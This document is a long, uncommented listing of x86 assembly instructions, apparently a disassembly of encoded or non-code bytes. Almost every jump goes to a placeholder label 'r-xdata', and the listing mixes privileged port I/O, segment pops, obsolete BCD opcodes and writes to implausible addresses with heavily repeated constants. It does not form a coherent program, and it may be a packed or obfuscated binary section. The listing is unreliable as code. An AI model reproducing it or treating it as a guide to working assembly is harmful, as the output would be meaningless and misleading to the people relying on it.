shl bl 0xe3
xchg esi eax
or al [ edi - 0x40 ]
jecxz r-xdata
mov esp edi
loop r-xdata
xchg esi eax
jecxz r-xdata
jae r-xdata
sbb bl [ esp + ebx ]
add ebx esi
retn 0xb4d5
shl ebx 0xe3
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb al 0x6e
jae r-xdata
or [ esp + ebx ] bl
or cl cl
adc al 0x3b
and [ ebx + 0x73 ] dh
in al dx
jae r-xdata
sbb al 0x60
scasd [ edi ]
mov bl 0x1c
je r-xdata
cmp esp [ eax ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3d3e38b ] eax
mov dh 0xbd
mov bh [ ecx + 0x6a858d89 ]
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
pop es
test [ edx - 0x42 ] ebp
test [ edx - 0x52 ] ebp
push 0xffffffbe
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb
or [ si ] bl
jecxz r-xdata
jecxz r-xdata
pop ebx
and eax 0x970a8a89
aas
sbb al 0x1c
outsb
aaa
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
scasb [ edi ]
push edi
outsb
cmpsb [ esi ] [ edi ]
or [ ebx + 0x6a858a89 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a6b ] ecx
or eax 0xe3e0d80a
jecxz r-xdata
and al 0xa6
xrstor [ eax + 0x270aaeb5 ]
cmp al 0x1c
sbb al 0x85
push 0xffffffa6
or edi [ ebx + 0x6a859189 ]
dec ebx
cmp ebx [ esp + ebx ]
or eax 0xa1c1c06
jae r-xdata
sbb ebx [ esp + ebx ]
jecxz r-xdata

mov ah 0xaf
jae r-xdata
sar [ eax ] 0x1
mov ah 0x66
mov [ edx - 0x1c1cc6f6 ] eax
push edi
mov esp 0x559e6a85
mov [ esi - 0x61957a44 ] ebp
push 0x859b8919
push 0xffffff9e
mov ecx 0x100a8789
mov [ ebp - 0x4249957b ] ecx
jae r-xdata
in al dx
jae r-xdata
pop edi
test [ edx - 0x62 ] ebp
jae r-xdata
push ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
nop [ esp + ebx ] bx
mov bl 0xa
cmp bl [ ebx ]
sbb al 0x1c
jecxz r-xdata
daa
out dx eax
mov ch 0xb
insd
leave
jecxz r-xdata
or esp [ edi + 0x8 ]
sbb al 0x1c
pushad
lss esi [ eax - 0x4be32f4c ]
and bp sp
daa
out 0xe3 al
jecxz r-xdata
inc bx
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
scasd [ edi ]
pop ebp
scasb [ edi ]
jae r-xdata
or edi esi
jae r-xdata
jae r-xdata
sbb al 0x1c
or cl [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
cmp eax 0xd01c1c1c
and edi [ ebp + edi * 4 + 0x737320b8 ]
cmpsd [ esi ] [ edi ]
or ah [ ebp + 0xb ]
sbb al 0x1c
outsb
sbb al 0x1c
mov ebp 0xa8789b9
adc dh al
jecxz r-xdata
test [ edx - 0x4a ] ebp
ror [ ebx ] cl
shl ebp cl
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
nop
jae r-xdata
sahf
jecxz r-xdata
push esp
jmp r-xdata
mov ah 0x89
loope r-xdata
push 0xb4b0b20f
rcr [ esp + esi * 4 ] 0x1
jae r-xdata
mov ecx esp
or ah [ ebx + 0x731c1c3c ]
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
jae r-xdata
or ax 0x1c06
sbb al 0xa
insd
sbb al 0x74
pavgw mm4 mm3
push edx
add bl [ esp + ebx ]
jae r-xdata
or ecx [ edi + 0xa1c1c08 ]
leave
mov bl 0xb4
sbb al 0x1c
jae r-xdata
xchg edx eax
in al dx
jecxz r-xdata
push esp
rol [ ebp - 0x2f5ea9a ] 0x1
loopne r-xdata
and esi [ ebx - 0x51911e77 ]
inc edi
jae r-xdata
idiv [ ecx ]
jae r-xdata
and [ edx + 0x6a859689 ] edi
xchg edi eax
jae r-xdata
jae r-xdata
push 0xffffffa6
pop es
or ch [ 0x6e1c1c39 ]
jae r-xdata
jecxz r-xdata
or ah cl
std
jecxz r-xdata
inc cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
shl ebx 0xe3
and cx [ edx ]
cmp ebp esp
jecxz r-xdata
sbb al 0xb5
or [ edx ] 0xffffff8f
mov al 0xa
lodsb [ esi ]
loopne r-xdata
cmp edi [ edx + 0x51be6a85 ]
jae r-xdata
mov [ 0xffffffff89b323d0 ] eax
loope r-xdata
test [ edx - 0x52 ] ebp
sub ebp [ eax + 0x2b ]
shl [ ebx ] 0x1
test [ edx - 0x42 ] ebp
push ebp
test [ edx - 0x5a ] ebp
xor eax edx
cmp [ esi - 0x5a ] ch
aaa
test [ edx - 0x6a ] ebp
sub eax 0x85eb9668
push 0xffffffbe
pop ebx
push 0x20ab339
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
and bp sp
adc [ bp + di ] 0x1c
sbb al 0x6e
pushad
daa
cmpsb [ esi ] [ edi ]
inc edi
or ebp ecx
in al dx
jecxz r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
push ds
sbb al 0x1c
pop ds
mov dl 0xa
scasb [ edi ]
jecxz r-xdata
jae r-xdata
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
aas
mov al 0xa
loope r-xdata
test [ edx - 0x4a ] ebp
cmp ecx [ edx ]
jecxz r-xdata
jae r-xdata
mov esi 0xae6a8551
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ edx + 0x73e3e3ec ]
jae r-xdata
push 0xffffffae
in al dx
jae r-xdata
fld [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov al 0x85
jae r-xdata
cmc
jecxz r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov al [ 0xffffffffe064e768 ]
cmpsb [ esi ] [ edi ]
inc ecx
push 0xffffffae
jae r-xdata
jecxz r-xdata
in al dx
pop ebx
loop r-xdata
rol [ esi ] 0x1
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
and esp [ ebx + 0x1c02670a ]
jae r-xdata
scasb [ edi ]
daa
push 0xbe6a853c
push ebx
push 0x6a85ba3b
mov [ edi + 0x21ae6a85 ] edx
mov edx 0x6a859689
jae r-xdata
jae r-xdata
cmp eax 0xd0e3e3f2
pop es
push 0x1b2207a6
cld
dec ebx
loop r-xdata
scasb [ edi ]
outsb
xchg di ax
sbb [ esp + ebx ] bl
or ch ah
in eax 0xe3
jecxz r-xdata
or bh [ edi ]

mov [ ebp + eax * 4 - 0x45f65196 ] eax
mov [ edx + 0xfae6a85 ] ecx
or al [ edi - 0x131c1c06 ]
rol [ 0x1c1c ] 0x1
jae r-xdata
outsb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ ecx - 0x39ecf565 ]
jecxz r-xdata
jae r-xdata
or ah [ edi + 0x2 ]
jae r-xdata
test [ edx - 0x52 ] ebp
in al dx
sbb al 0x89
or cl [ edi + 0x1f ]
test [ ebx - 0x1e ] ebx
cmp eax 0xd0e3e3f2
jae r-xdata
mov [ ebx - 0x1c39ecf6 ] ebx
jecxz r-xdata
jmp r-xdata
push 0x54ec1fa6
sbb al 0xec
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
cmp [ edx + 0x6a85cd89 ] edi
scasb [ edi ]
aas
mov edx 0x3dae6a85
push 0xa66a852b
pushad
pop es
shl [ ebx ] 0x1
scasb [ edi ]
cmp eax 0x6a852b68
cmpsb [ esi ] [ edi ]
out 0xa0 eax
push 0xa6e064e7
cmpsb [ esi ] [ edi ]
pop ds
in al dx
push esp
push ds
jae r-xdata
jae r-xdata
add bl [ esp + ebx ]
jae r-xdata
sbb ebx [ edx + ecx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
ficomp [ edi + 0x67ecc3c7 ]
jecxz r-xdata
push 0xffffffa6
push esp
cmp al 0x35
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ 0x73731c1c ] ecx
sbb ebx [ esp + esi * 4 ]
xchg [ eax + 0x1b ] esp
sbb al 0xa
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
test [ edx - 0x52 ] ebp
xor eax 0x858289ba
push 0xffffffae
cmp edi [ edx + 0x6a858489 ]
jae r-xdata
or dl [ ecx ]
or eax 0x73731c1c
jae r-xdata
jae r-xdata
lahf
outsb
jae r-xdata
out 0x8b eax
mov al 0x1c
mov ch 0xf7
mov ah 0x1c
jne r-xdata
jae r-xdata
mov esp ebx
shl ebx cl
jecxz r-xdata
xor eax 0xe7891c1c
mov al 0xb5
test edx ebx
jmp r-xdata
jecxz r-xdata
sub bl bh
or bl bl
push 0xffffffa7
mov ebx 0x67ec2366
test al 0xf7
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push eax
or bl [ esp + ebx ]
jecxz r-xdata
ja r-xdata
push 0x18e40a0f
sbb al 0x1c
push 0xae6a852b
or edi [ edx + 0x6a858489 ]
scasb [ edi ]
or [ edx + 0x6a858a89 ] edi
scasb [ edi ]
mov [ 0x1c02670a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
pop es
jae r-xdata
sbb al 0x73
mov ah 0xa
cwde
jmp r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc ecx [ ecx + 0xa206891 ]
fdivr st2
jecxz r-xdata
mov [ esi - 0x59957a48 ] eax
push 0xa66a1ba6
jecxz r-xdata
jae r-xdata
or ch [ edx + 0x731c1c0d ]
mov al [ 0xffffffff901cb3fd ]
mov ebx 0xbb42568
mov esi 0x60e3e3fb
outsb
in al dx
jae r-xdata
jae r-xdata
push 0x87b41c1b
pushad
push 0xefa368e2
push 0xe368efa3
push 0xfba368e3
push 0xffffffe7
mov esi 0xba3b6853
jecxz r-xdata
add bl [ si ]
jae r-xdata
push 0x5e
aaa
push ds
sbb al 0x1c
and cx [ edx ]
loope r-xdata
jae r-xdata
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
sbb ebp [ edx - 0x5a ]
and esp [ ebx + 0x6a85202a ]
xor [ eax ] bl
adc eax 0x3c682d68
jae r-xdata
test [ eax + 0xa ] 0x77
out 0xe3 eax
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop ds
or dl [ edx + edi * 8 - 0x1d ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sahf
shl [ ebx ] 0x1
mov [ 0x6a85202a ] eax
jecxz r-xdata
mov edx 0xe3cba40b
jecxz r-xdata
sbb al 0x1c
mov edi esp
cmp al 0x35
jae r-xdata
push 0xee00a0f
sbb al 0x1c
jae r-xdata
mov al 0xb3
or esp ecx
or [ esp + ebx ] ebx
pushad
daa
out dx eax
mov al 0xa
or [ eax ] 0x6a731c1c
cmpsd [ esi ] [ edi ]
pushad
lahf
mov edi 0x6a67ece3

sbb al 0x1c
jae r-xdata
or dl [ edi + 0x731c1c18 ]
jae r-xdata
pushad
sub eax 0x18303c68
jae r-xdata
and al bl
jecxz r-xdata
mov ebx 0x85b88689
or [ ebx + 0x6a858489 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a7a ] ecx
or eax 0xc1c00abb
jecxz r-xdata
xchg esi eax
jae r-xdata
jmp r-xdata
sbb al 0x1c
jae r-xdata
or dl [ ebx ]
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
sbb esp [ esi + 0x1c ]
test [ edx ] 0x1c1c1897
jae r-xdata
out 0xc7 eax
mov edx 0x73737320
jae r-xdata
daa
pushad
sbb al 0x1c
jae r-xdata
sbb esp edx
in al dx
sub bl bh
and [ ebx + 0x73 ] dh
mov ch 0x85
sti
jae r-xdata
mov ebx esi
or cl [ edi + 0x1f ]
or edx [ eax + 0xa ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb [ esp + ebx ] bl
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
push ebp
loop r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
or edi [ ebx + 0x6a858289 ]
cmpsb [ esi ] [ edi ]
scasb [ edi ]
add ecx [ edx ]
call 0x742a1e79
sbb al 0x96
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
xor [ ecx + 0xa0d0a86 ] ecx
cmc
jecxz r-xdata
in al dx
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
rcl [ 0x3c682d68 ] 0x1
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
or bh bl
or bl [ eax + 0x73e3e3eb ]
jae r-xdata
cli
jecxz r-xdata
jae r-xdata
pop edx
shl ebx cl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb4
mov bl 0xa
adc eax [ eax ]
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
push 0xffffff9e
pop ds
mov esp 0x6a85a189
sahf
push ebx
mov esp 0x519e6a85
outsb
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + edi + 0x1c ]
sbb al 0x73
mov ah 0xb4
mov ebx eax
or bh [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
sbb al 0x1c
test edx ebx
xlat
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0x303c682d
sbb [ eax + 0x25 ] ah
jmp r-xdata
jae r-xdata
inc ebp
cmp esp [ esi + 0x38 ]
in al dx
adc [ di ] dh
cmpsb [ esi ] [ edi ]
pop es
jae r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
push 0x68e368e3
sbb al 0x1c
shr [ edx ] 0x1
fisubr [ esi + 0x2e65ecef ]
and edi [ ebp + 0x737320b8 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dl 0xa
sbb edx [ esp + ebx ]
sbb al 0x73
jae r-xdata
sbb al 0x75
imul esp ebx 0xffffffe3
in al dx
jl r-xdata
fcmovbe st7
mov ebx 0x73e3e3f9
jae r-xdata
sbb al 0xba
mov edx 0xb23bae6e
mov [ ebx + 0x6ab3951c ] esp
in al dx
jae r-xdata
dec esp
cmp ebx [ esp + ebx ]
jae r-xdata
mov ah 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
fsubrp st2
jecxz r-xdata
inc [ esi ]
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
mul ebx
jecxz r-xdata
and eax 0xbf6ba1eb
push 0x6018303c
in al dx
fistp [ esi ]
or edi edi
jae r-xdata
mov eax 0x73737320
jae r-xdata
sbb al 0x96
adc ecx [ edx ]
xchg [ edx ] cl
jae r-xdata
or al dh
pop ss
sbb eax 0xb31c1c1f
jae r-xdata
jae r-xdata
mov bh 0xea
jecxz r-xdata
sbb al 0x1c
pushad
or al 0x1c
jae r-xdata
or dh al
sbb [ esp + ebx ] bl
jae r-xdata
mov ah 0x89
retn
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x60e3e3c6 ]
cmpsb [ esi ] [ edi ]
pop ds

jae r-xdata
jae r-xdata
mov ebp 0x737320b8
jae r-xdata
push 0x36450a13
cmp eax 0x1c03b70a
test al 0xab
mov dl 0x68
test al 0xbb
or ecx [ edx ]
out dx eax
jecxz r-xdata
sbb al 0x1c
[ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0x731c1c0a
jae r-xdata
or al [ esi + 0x731c1c10 ]
jae r-xdata
inc bx
sbb al 0xb4
mov bl 0xb0
sbb al 0x74
dec edi
in al dx
and [ ebx + 0x73 ] dh
jae r-xdata
in al dx
push 0x68b2b20f
scasb [ edi ]
jmp r-xdata
or dh [ edi + 0x73e3e3ea ]
jae r-xdata
push esp
jae r-xdata
jae r-xdata
mov [ esi + 0x1c0a0d0a ] eax
jae r-xdata
or ah [ ebx + 0xa ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0xf7460a3b
jecxz r-xdata
sbb al 0x1c
mov edx 0x3bae6eba
mov dl 0x89
jae r-xdata
sbb al 0xb3
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jne r-xdata
jecxz r-xdata
mov [ 0x6ab3951c ] eax
jecxz r-xdata
and esp ecx
sbb al 0x60
in al dx
jae r-xdata
retn
xchg esi eax
push ds
inc ebx
jae r-xdata
mov dh 0x3f
or ebp [ ecx + 0xae3e3e1 ]
inc edi
cmp al 0x1c
sbb al 0x73
jae r-xdata
pushad
and ah cl
pushad
and ecx esp
test [ esi + 0x23 ] esp
in al dx
test eax 0xec1c1c37
push esp
loope r-xdata
and ah cl
pushad
jae r-xdata
xchg esi eax
push 0xffffffa6
sbb ebx [ esp + esi * 4 ]
mov bh 0x66
and ebp esp
or cl [ 0x731c1c0a ]
jae r-xdata
jecxz r-xdata
xchg edi eax
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jecxz r-xdata
xchg [ esp + esi * 4 ] ebx
jmp r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cld
jmp 0x73ba2107
jae r-xdata
jae r-xdata
mov cl 0x34
sbb al 0x1c
loope r-xdata
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffae
jae r-xdata
push 0x9b0a1ba6
jae r-xdata
push 0x630ab20f
lea ebp [ eax + 0x39 ]
test [ edx - 0x42 ] ebp
loope r-xdata
jae r-xdata
sbb al 0xb3
mov bl 0x1c
mov ah 0xb3
mov al 0x1c
je r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x97
jae r-xdata
and ebp [ esi - 0x47 ]
xor esp [ eax + 0x18 ]
0x1c0b1d0a 0x731c
or eax 0xd01c1c04
sub bl dl
scasb [ edi ]
out dx eax
in al dx
lea eax [ 0x140a1c1c ]
sbb [ esp + ebx ] bl
sbb al 0x73
outsb
scasb [ edi ]
cmp esi [ edx - 0x6ae35c77 ]
mov bl 0x6a
and bl ah
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
mov al 0xb5
mov ah 0x68
adc ebx [ edi - 0x1e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah bl
xor eax 0x73731c1c
jae r-xdata
push cs
sbb ecx [ edx ]
jae r-xdata
xchg [ eax ] dl
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
push esp
shl [ eax + 0x22 ] cl
loope r-xdata
in ax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
mov ebx esp
mov ch 0xb
rol [ esi ] cl
sbb al 0x1c
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
mov bl 0xa
fadd st0
jecxz r-xdata
or bl [ edx + 0x12 ]
jecxz r-xdata
sbb al 0xb5
fild [ eax - 0x5a ]
jae r-xdata
mov ebp ebx
loope r-xdata
loop r-xdata
jae r-xdata
fwait
jae r-xdata
jae r-xdata
jae r-xdata
or bl ah
jae r-xdata
test [ edx - 0x42 ] ebp
mov [ ebp + 0x6a853968 ] ecx
mov esi 0x6a85b8e1
mov esi 0xb8d589e7
xchg esi eax
shr [ edx ] 0x1
jae r-xdata
jno r-xdata
test [ edx - 0x42 ] ebp
sbb al 0x1c
mov dh 0x68
lss ecx [ edx ]
arpl [ edx ] cx
or bh bl
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x3b470ae5
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x68
sbb eax 0x1c1ed50a
sbb al 0x73
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
in al dx
sbb ebx eax
and al 0xa
retn 0xe3c0
into
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl bl 0xe3
shl [ ebx ] 0x1
and [ ebx + 0x73 ] dh
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
jae r-xdata
adc bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
in eax 0xa
push 0xffffffbe
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
jae r-xdata
pushad
jae r-xdata
sbb al 0x1c
or al [ edi + 0x3b ]
jae r-xdata
jae r-xdata
sbb al 0x1c
mov dh 0x68
lss esi [ edx - 0x4f145198 ]
or bh dh
jae r-xdata
jae r-xdata
or edx [ ecx ]
adc [ si ] ebx
sbb al 0x73
jae r-xdata
out 0x89 eax
push 0xffffffbe
jmp r-xdata
push 0x164a0b25
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
mov esp ebx
jae r-xdata
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
xor ebp [ esi + 0x66 ]
arpl [ esi ] bx
sbb al 0x1c
mov al 0xb3
cmpsb [ esi ] [ edi ]
jecxz r-xdata
and ecx [ edx ]
sub al 0xff
jae r-xdata
jae r-xdata
mov bl 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
paddd mm4 mm3
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jbe r-xdata
sbb al 0xec
pop ss
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0xb4
dec [ ebx - 0x1c1c9c1d ]
mov al 0xa
sbb al 0x96
or ch [ ecx + edi ]
sbb al 0x1c
push 0x1ed50a1d
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
cmp ebx [ esp + ebx ]
and bp sp
jae r-xdata
or eax 0x8b731c1c
jae r-xdata
add eax 0x73731c1c
aaa
sbb al 0x1c
push 0x110beba6
jae r-xdata
sbb al 0x1c
pushad
or ecx [ edx + 0x16 ]
jae r-xdata
mov edx 0x66ec2366
pop ebp
sbb [ esp + ebx ] bl
jae r-xdata
or ch [ edi + edi * 8 ]
push 0xffffffa6
jae r-xdata
mov al 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0xb3e3e3e2
jae r-xdata
jae r-xdata
in al dx
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov ch 0x87
scasb [ edi ]
jae r-xdata
jae r-xdata
punpckldq mmx1 [ edi ]
jae r-xdata
inc edi
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
outsb
mov ecx 0xea186033
or bl [ 0x731c1c0b ]
jae r-xdata
jae r-xdata
or ecx [ ebp + 0xa1c1c05 ]
adc al 0x18
sbb al 0x1c
jae r-xdata
pop cx
in eax dx
sbb al 0x60
jecxz r-xdata
sbb al 0x73
adc ebx eax
jae r-xdata
jecxz r-xdata
jae r-xdata
xor bh bh
jecxz r-xdata
jecxz r-xdata
jae r-xdata
shl dh 0x1
jecxz r-xdata
test [ eax - 0x25 ] esp
jecxz r-xdata
mov ch 0x68
adc ebp esp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
and [ esp + ebx ] edi
sbb al 0x68
lodsd [ esi ]

sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
insd
loopne r-xdata
popad
adc [ esp + ebx ] bl
mov ebx esp
sbb al 0x75
dec edi
and ebp esp
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
dec ebx
pop ss
sbb al 0x1c
jae r-xdata
mov al 0x36
sbb al 0x1c
or ch [ ecx ]
loope r-xdata
pop ds
pushad
sahf
pop ds
loopne r-xdata
or al 0x1c
push 0xed67ec13
mov [ ebp + 0x600a1b68 ] edx
sbb [ esp + ebx ] ebx
pushad
jae r-xdata
jecxz r-xdata
or bl bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
pushad
fninit
jecxz r-xdata
or ah cl
sbb al 0x1c
mov bh 0xea
bound ecx [ edi ]
xor [ esp + ebx ] bl
or cl dh
jae r-xdata
mov ch 0xdf
sbb al 0x73
aad 0xb8
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb dh [ ebx ]
sbb al 0x73
jae r-xdata
and [ si ] edi
sbb al 0x1c
push 0xa668cbad
aaa
and ebp esp
or dh [ ecx + 0x3b ]
or edi [ ebx - 0x4c1c1c1e ]
0xecd21a60 0x4266
sbb al 0x68
jae r-xdata
push 0xffffffa6
pop ss
mov [ edi - 0x57f5da98 ] edi
jecxz r-xdata
and eax 0xe3f7a80a
jae r-xdata
and ch [ edx ]
and [ ebx + 0x73 ] dh
jae r-xdata
push 0xa6d81fa6
mov edx 0xa323d0ba
or al [ edi + 0x73e3e3f4 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or eax [ 0x73731c1c ]
or dh [ ebx - 0x12 ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
out dx al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ edi + 0x11 ]
sbb al 0x1c
jae r-xdata
in eax dx
jae r-xdata
dec ebp
shl [ ebx ] 0x1
mov [ 0x73737320 ] eax
jae r-xdata
jae r-xdata
jae r-xdata
or ch [ eax + 0x73e3e3f7 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
jae r-xdata
test al 0xf7
jae r-xdata
sbb ecx [ ebx ]
jae r-xdata
or cl [ edx + 0x73e3e3e1 ]
jae r-xdata
mov dl 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx al
jae r-xdata
loope r-xdata
movsd [ edi ] [ esi ]
fcom [ ebx ]
in al dx
popad
push 0x54ece7ab
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ebp esp
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
or ebx [ 0xffffffffb31c1c1f ]
jae r-xdata
pop ds
mul ebx
jae r-xdata
push esp
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffae
adc ecx [ edx ]
int3
cmpsb [ esi ] [ edi ]
salc
jae r-xdata
add eax 0x601c1c1b
cmp ah ch
jae r-xdata
and eax 0xd1f0ae1
pushad
sar [ edx + 0x68e26887 ] cl
xchg [ edi ] bl
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
push 0xffffffbe
jecxz r-xdata
jae r-xdata
pop ds
fucomi st6
push 0xa10d813
out 0xec eax
jae r-xdata
jae r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
sbb al 0x1c
cmpsb [ esi ] [ edi ]
jae r-xdata
pop edx
jae r-xdata
jae r-xdata
mov [ 0x1fa66aeb ] eax
or dl cl
xor eax 0x73731c1c
mov ebx edx
mov edx 0x68e26887
sub ecx esp
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
pushad
lahf
mov bl 0x68
and eax 0x1c164a0b
sbb al 0x60
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or eax 0x661c1c1b
in al dx
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
in al dx
jae r-xdata
sbb al 0x60
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
test [ edx - 0x42 ] ebp
jae r-xdata
mov ah 0xb3
jae r-xdata
xchg ebp eax
push 0x19600a1b
sbb al 0x1c
sbb edx ebp
in al dx
loope r-xdata
retn
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edx 0xaa323d0
xchg esp esi
jecxz r-xdata
jae r-xdata
jae r-xdata
fsub [ esi - 0x2f9813e5 ]
mul bl
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x8b
jae r-xdata
jae r-xdata
add eax 0x601c1c1b
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xor al 0xa
jae r-xdata
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
mov esi 0xa3a68ef
jae r-xdata
sbb ecx [ ebx - 0x1c1c1d19 ]
jae r-xdata
or bl [ edi ]
jae r-xdata
in al dx
inc dx
sti
jecxz r-xdata
jae r-xdata
push ebp
adc [ esp + ebx ] ebx
xchg [ edi ] bl
jecxz r-xdata
pushad
mov dh 0xa
loope r-xdata
sbb al 0xb
jae r-xdata
push 0x20d8efa6
push 0xec1c663b
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
jae r-xdata
push 0xffffffee
jae r-xdata
or dl [ ecx + 0x37 ]
out dx eax
fsub [ eax ]
jae r-xdata
sbb al 0x1c
jmp r-xdata
jae r-xdata
jae r-xdata
push 0xfec40a3a
jecxz r-xdata
